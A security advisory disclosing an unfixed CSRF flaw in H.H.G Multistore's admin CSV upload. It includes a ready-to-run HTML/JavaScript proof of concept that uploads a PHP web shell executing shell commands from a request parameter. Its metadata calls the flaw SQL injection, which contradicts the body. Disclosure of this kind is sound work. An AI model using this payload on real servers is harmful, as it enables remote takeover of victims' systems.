---

title: "H.H.G Multistore <= 5.1.0 - CSRF in CSV File Upload"
date: 2022-05-15
draft: false
authors: ["blockomat"]
tags: ["advisory"]
description: "SQL-Injection H.H.G Multistore"
featuredImage: "/alert.jpg"
featuredImagePreview: "/alert_crop.png"
---
Security vulnerabilities were found in [H.H.G Multistore](https://www.hhg-multistore.com/) <= 5.1.0.

There is no patch available. This product seems to be end of life, last versions were published 4/5 years ago.
<!--more-->

**CVE-ID:** CVE-2022-XXXXX (pending)

**Affected Product:** H.H.G Multistore

**Affected Versions:** Community Edition <= 4.10.3; Enterprise Edition <= 5.1.0

**Vulnerability:** CSRF

**Vendor URL:** [https://www.hhg-multistore.com/](https://www.hhg-multistore.com/)

**Status:** Unfixed

**Severity:** High


## Timeline
- 2022-05-05: Discovery
- 2022-05-15: Date Published

## Description
The CSV File Upload method in the admin panel is vulnerable to a CSRF.
The CSV File Upload accepts PHP instead of CSV files only, which increases the risk of this CSRF.
A successful exploit will create a web shell in the the following web path `/store_files/1/import/cmd.gif.php`.


## Proof of Concept
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
	var target = "http://localhost";
        var xhr = new XMLHttpRequest();
        xhr.open("POST", target + "/admin\/index.php?module=csv_backend&action=upload", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------347642001511243116663838125471");
        xhr.withCredentials = true;
        var body = "-----------------------------347642001511243116663838125471\r\n" + 
          "Content-Disposition: form-data; name=\"file_upload\"; filename=\"cmd.gif.php\"\r\n" + 
          "Content-Type: application/x-php\r\n" + 
          "\r\n" + 
          "GIF8;\n" + 
          "\n" + 
          "\x3c?php echo shell_exec($_REQUEST[\'blocki\']); ?\x3e\n" + 
          "\n" + 
          "\r\n" + 
          "-----------------------------347642001511243116663838125471--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
	<script>
		submitRequest();
	</script>
  </body>
</html>
```
